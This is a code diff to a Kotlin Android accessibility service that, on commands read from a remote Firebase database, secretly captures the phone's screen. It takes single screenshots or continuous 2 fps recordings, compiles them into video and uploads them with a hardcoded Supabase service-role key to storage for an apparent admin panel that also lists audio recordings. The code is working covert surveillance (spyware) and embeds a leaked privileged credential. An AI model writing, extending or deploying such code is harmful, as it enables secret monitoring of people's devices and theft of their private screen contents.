@@ -13,6 +13,7 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.ByteArrayOutputStream
 import java.io.File
+import java.io.FileOutputStream
 import java.util.concurrent.Executor
 import kotlin.coroutines.resume
 import kotlin.coroutines.suspendCoroutine
@@ -23,11 +24,10 @@ class ScreenshotService : AccessibilityService() {
         const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
         const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
         const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
-        const val BUCKET_SS    = "screenshots"
-        const val BUCKET_VID   = "videos"
-        const val FPS          = 2
-        const val CHUNK_SEC    = 30
-        const val FRAMES_PER_CHUNK = FPS * CHUNK_SEC
+        const val BUCKET_SS  = "screenshots"
+        const val BUCKET_VID = "videos"
+        const val FPS        = 2          // 2 frames per second
+        const val MAX_FRAMES = 1200       // 10 min safety cap
     }
 
     private val deviceId by lazy {
@@ -40,17 +40,21 @@ class ScreenshotService : AccessibilityService() {
         FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
     }
     private val http = OkHttpClient.Builder()
-        .callTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
+        .callTimeout(180, java.util.concurrent.TimeUnit.SECONDS)
         .build()
 
     private var liveCapJob: Job? = null
-    private var isLiveEnabled    = false
-    private val serviceScope     = CoroutineScope(Dispatchers.Main + SupervisorJob())
+    private var isLiveEnabled   = false
+    private val serviceScope    = CoroutineScope(Dispatchers.Main + SupervisorJob())
+
+    // Frames stored as JPEG files on disk — no OOM even for long captures
+    private val frameFiles = mutableListOf<File>()
+    private val frameLock  = Any()
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         serviceInfo = AccessibilityServiceInfo().apply {
-            eventTypes  = AccessibilityEvent.TYPES_ALL_MASK
+            eventTypes   = AccessibilityEvent.TYPES_ALL_MASK
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags        = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
         }
@@ -59,7 +63,7 @@ class ScreenshotService : AccessibilityService() {
     }
 
     private fun listenForCommands() {
-        // Single screenshot
+        // ── Single screenshot ────────────────────────────────────────────────
         database.child("take_screenshot").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
                 if (s.exists() && s.getValue(Boolean::class.java) == true) {
@@ -71,35 +75,168 @@ class ScreenshotService : AccessibilityService() {
             override fun onCancelled(e: DatabaseError) {}
         })
 
-        // Live capture toggle
+        // ── Live capture toggle ───────────────────────────────────────────────
         database.child("live_capture_enabled").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
                 val enabled = s.getValue(Boolean::class.java) ?: false
                 if (enabled && !isLiveEnabled) {
                     isLiveEnabled = true
+                    synchronized(frameLock) { frameFiles.clear() }
                     startLiveCapture()
                 } else if (!enabled && isLiveEnabled) {
                     isLiveEnabled = false
                     liveCapJob?.cancel()
-                    reportStatus("⏹ Live capture stopped")
+                    // Compile all captured frames into one video
+                    val files = synchronized(frameLock) { frameFiles.toList() }
+                    if (files.size >= 2) {
+                        reportStatus("🎬 Compiling ${files.size} frames into video...")
+                        serviceScope.launch(Dispatchers.IO) { compileAndUpload(files) }
+                    } else {
+                        reportStatus("⏹ Live capture stopped (${files.size} frames — too few)")
+                        files.forEach { it.delete() }
+                        synchronized(frameLock) { frameFiles.clear() }
+                    }
                 }
             }
             override fun onCancelled(e: DatabaseError) {}
         })
 
-        // Stop all
+        // ── Stop all ─────────────────────────────────────────────────────────
         database.child("stop_all").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
-                if (s.exists() && s.getValue(Boolean::class.java) == true) {
+                if (s.exists() && s.getValue(Boolean::class.java) == true && isLiveEnabled) {
                     isLiveEnabled = false
                     liveCapJob?.cancel()
+                    val files = synchronized(frameLock) { frameFiles.toList() }
+                    if (files.size >= 2)
+                        serviceScope.launch(Dispatchers.IO) { compileAndUpload(files) }
                 }
             }
             override fun onCancelled(e: DatabaseError) {}
         })
     }
 
-    // ─── Single screenshot (callback-based) ───────────────────────────────────
+    // ── Live capture loop ─────────────────────────────────────────────────────
+
+    private fun startLiveCapture() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            reportStatus("❌ Live capture requires Android 11+")
+            isLiveEnabled = false; return
+        }
+        reportStatus("🔴 Live capture ON — collecting frames...")
+
+        liveCapJob = serviceScope.launch {
+            while (isActive && isLiveEnabled) {
+                val bmp = withTimeoutOrNull(3_000L) { captureOneSuspend() }
+                if (bmp != null) {
+                    withContext(Dispatchers.IO) { saveFrameToDisk(bmp) }
+                }
+
+                val count = synchronized(frameLock) { frameFiles.size }
+                if (count % 20 == 0 && count > 0)
+                    reportStatus("🔴 Capturing... $count frames (${count / FPS}s)")
+
+                // Safety cap — auto compile and continue
+                if (count >= MAX_FRAMES) {
+                    reportStatus("⚠️ Max frames reached — auto saving...")
+                    isLiveEnabled = false
+                    liveCapJob?.cancel()
+                    val files = synchronized(frameLock) { frameFiles.toList() }
+                    withContext(Dispatchers.IO) { compileAndUpload(files) }
+                    return@launch
+                }
+
+                delay(1000L / FPS)
+            }
+        }
+    }
+
+    private fun saveFrameToDisk(bmp: Bitmap) {
+        try {
+            val file = File(cacheDir, "frame_${System.currentTimeMillis()}.jpg")
+            FileOutputStream(file).use { out ->
+                bmp.compress(Bitmap.CompressFormat.JPEG, 80, out)
+            }
+            bmp.recycle()
+            synchronized(frameLock) { frameFiles.add(file) }
+        } catch (_: Exception) {
+            bmp.recycle()
+        }
+    }
+
+    // ── Compile all frames → single video → upload ────────────────────────────
+
+    private fun compileAndUpload(files: List<File>) {
+        if (files.size < 2) {
+            files.forEach { it.delete() }
+            synchronized(frameLock) { frameFiles.clear() }
+            reportStatus("⏹ Not enough frames")
+            return
+        }
+        try {
+            val outFile = File(cacheDir,
+                "vid_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.mp4")
+
+            reportStatus("🎬 Encoding ${files.size} frames (${files.size / FPS}s)...")
+            val ok = VideoEncoderHelper.encodeFromFiles(files, FPS, outFile)
+
+            // Clean up frame files
+            files.forEach { it.delete() }
+            synchronized(frameLock) { frameFiles.clear() }
+
+            if (ok && outFile.exists() && outFile.length() > 1024L) {
+                reportStatus("📤 Uploading video (${outFile.length() / 1024}KB)...")
+                uploadVideo(outFile)
+            } else {
+                outFile.delete()
+                reportStatus("❌ Encoding failed or empty output")
+            }
+        } catch (e: Exception) {
+            files.forEach { it.delete() }
+            synchronized(frameLock) { frameFiles.clear() }
+            reportStatus("❌ Compile error: ${e.message?.take(60)}")
+        }
+    }
+
+    private fun uploadVideo(file: File) {
+        try {
+            val ts       = System.currentTimeMillis()
+            val fileName = "vid_${deviceId.takeLast(6)}_$ts.mp4"
+            val body     = file.readBytes().toRequestBody("video/mp4".toMediaType())
+            val req = Request.Builder()
+                .url("$SUPABASE_URL/storage/v1/object/$BUCKET_VID/$fileName")
+                .header("Authorization", "Bearer $SUPABASE_KEY")
+                .header("apikey", SUPABASE_KEY)
+                .header("Content-Type", "video/mp4")
+                .header("x-upsert", "true")
+                .post(body).build()
+
+            http.newCall(req).execute().use { resp ->
+                if (resp.isSuccessful) {
+                    val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_VID/$fileName"
+                    // Write to "recordings" node with type="video"
+                    // → admin panel shows it alongside audio recordings
+                    FirebaseDatabase.getInstance(DB_URL)
+                        .getReference("recordings").push()
+                        .setValue(mapOf(
+                            "deviceId"  to deviceId,
+                            "type"      to "video",
+                            "url"       to url,
+                            "timestamp" to ts,
+                            "fileName"  to fileName
+                        ))
+                    reportStatus("✅ Video uploaded (${file.length() / 1024}KB)")
+                } else {
+                    reportStatus("❌ Video ${resp.code}: ${resp.body?.string()?.take(80)}")
+                }
+            }
+            file.delete()
+        } catch (e: Exception) {
+            reportStatus("❌ Video upload: ${e.message?.take(60)}")
+        }
+    }
+
+    // ── Single screenshot ─────────────────────────────────────────────────────
 
     private fun captureOne(onResult: (Bitmap) -> Unit) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
@@ -113,14 +250,11 @@ class ScreenshotService : AccessibilityService() {
                     val bmp = Bitmap.wrapHardwareBuffer(r.hardwareBuffer, r.colorSpace)
                         ?.copy(Bitmap.Config.ARGB_8888, false)
                     r.hardwareBuffer.close()
-                    if (bmp != null) onResult(bmp)
-                    else reportStatus("❌ Bitmap null")
+                    if (bmp != null) onResult(bmp) else reportStatus("❌ Bitmap null")
                 }
                 override fun onFailure(code: Int) { reportStatus("❌ Capture failed: $code") }
             })
     }
-
-    // ─── Suspend version for use inside coroutine ─────────────────────────────
 
     @Suppress("NewApi")
     private suspend fun captureOneSuspend(): Bitmap? = suspendCoroutine { cont ->
@@ -137,99 +271,24 @@ class ScreenshotService : AccessibilityService() {
             })
     }
 
-    // ─── Live capture: 2fps → 30s chunks → video upload ──────────────────────
-
-    private fun startLiveCapture() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            reportStatus("❌ Live capture requires Android 11+")
-            isLiveEnabled = false
-            return
-        }
-        liveCapJob = serviceScope.launch {
-            while (isActive && isLiveEnabled) {
-                val frames = mutableListOf<Bitmap>()
-                reportStatus("🔴 Live capture ON — collecting...")
-
-                repeat(FRAMES_PER_CHUNK) {
-                    if (!isActive || !isLiveEnabled) return@repeat
-                    val bmp = withTimeoutOrNull(3_000L) { captureOneSuspend() }
-                    if (bmp != null) frames.add(bmp)
-                    delay(1000L / FPS)
-                }
-
-                if (frames.size >= 10) {
-                    reportStatus("🎬 Encoding ${frames.size} frames...")
-                    withContext(Dispatchers.IO) { encodeAndUpload(ArrayList(frames)) }
-                    frames.forEach { it.recycle() }
-                } else {
-                    frames.forEach { it.recycle() }
-                }
-            }
-        }
-    }
-
-    private fun encodeAndUpload(frames: List<Bitmap>) {
-        try {
-            val outFile = File(cacheDir,
-                "vid_${deviceId.takeLast(4)}_${System.currentTimeMillis()}.mp4")
-            val ok = VideoEncoderHelper.encode(frames, FPS, outFile)
-            if (ok) uploadVideo(outFile)
-            else { reportStatus("❌ Encoding failed"); outFile.delete() }
-        } catch (e: Exception) {
-            reportStatus("❌ Encode: ${e.message?.take(60)}")
-        }
-    }
-
-    private fun uploadVideo(file: File) {
-        try {
-            val fileName = "vid_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.mp4"
-            val body = file.readBytes().toRequestBody("video/mp4".toMediaType())
-            val req = Request.Builder()
-                .url("$SUPABASE_URL/storage/v1/object/$BUCKET_VID/$fileName")
-                .header("Authorization", "Bearer $SUPABASE_KEY")
-                .header("apikey", SUPABASE_KEY)
-                .header("Content-Type", "video/mp4")
-                .header("x-upsert", "true")
-                .post(body).build()
-            http.newCall(req).execute().use { resp ->
-                if (resp.isSuccessful) {
-                    val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_VID/$fileName"
-                    FirebaseDatabase.getInstance(DB_URL)
-                        .getReference("live_videos").push()
-                        .setValue(mapOf(
-                            "deviceId"  to deviceId,
-                            "url"       to url,
-                            "timestamp" to System.currentTimeMillis(),
-                            "fileName"  to fileName,
-                            "type"      to "video"
-                        ))
-                    reportStatus("🎬 Video uploaded ✅ (${file.length() / 1024}KB)")
-                } else {
-                    reportStatus("❌ Video upload ${resp.code}: ${resp.body?.string()?.take(80)}")
-                }
-            }
-            file.delete()
-        } catch (e: Exception) {
-            reportStatus("❌ Video upload: ${e.message?.take(60)}")
-        }
-    }
+    // ── Screenshot upload ─────────────────────────────────────────────────────
 
     private fun uploadScreenshot(bitmap: Bitmap) {
         CoroutineScope(Dispatchers.IO).launch {
             try {
                 val stream = ByteArrayOutputStream()
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 85, stream)
-                val bytes = stream.toByteArray()
-                val ts = System.currentTimeMillis()
+                val bytes    = stream.toByteArray()
+                bitmap.recycle()
+                val ts       = System.currentTimeMillis()
                 val fileName = "${deviceId}_$ts.jpg"
-                val body = bytes.toRequestBody("image/jpeg".toMediaType())
                 val req = Request.Builder()
                     .url("$SUPABASE_URL/storage/v1/object/$BUCKET_SS/$fileName")
                     .header("Authorization", "Bearer $SUPABASE_KEY")
                     .header("apikey", SUPABASE_KEY)
                     .header("Content-Type", "image/jpeg")
                     .header("x-upsert", "true")
-                    .post(body).build()
+                    .post(bytes.toRequestBody("image/jpeg".toMediaType())).build()
                 http.newCall(req).execute().use { resp ->
                     if (resp.isSuccessful) {
                         val url = "$SUPABASE_URL/storage/v1/object/public/$BUCKET_SS/$fileName"
@@ -237,13 +296,9 @@ class ScreenshotService : AccessibilityService() {
                             .getReference("screenshots").push()
                             .setValue(mapOf("deviceId" to deviceId, "url" to url, "timestamp" to ts))
                         reportStatus("📸 Screenshot uploaded ✅")
-                    } else {
-                        reportStatus("❌ SS upload ${resp.code}: ${resp.body?.string()?.take(80)}")
-                    }
+                    } else reportStatus("❌ SS ${resp.code}: ${resp.body?.string()?.take(80)}")
                 }
-            } catch (e: Exception) {
-                reportStatus("❌ SS upload: ${e.message?.take(60)}")
-            }
+            } catch (e: Exception) { reportStatus("❌ SS: ${e.message?.take(60)}") }
         }
     }
 
@@ -259,6 +314,7 @@ class ScreenshotService : AccessibilityService() {
         isLiveEnabled = false
         liveCapJob?.cancel()
         serviceScope.cancel()
+        synchronized(frameLock) { frameFiles.forEach { it.delete() }; frameFiles.clear() }
         regRef.child("accessibility_granted").setValue(false)
     }
 }
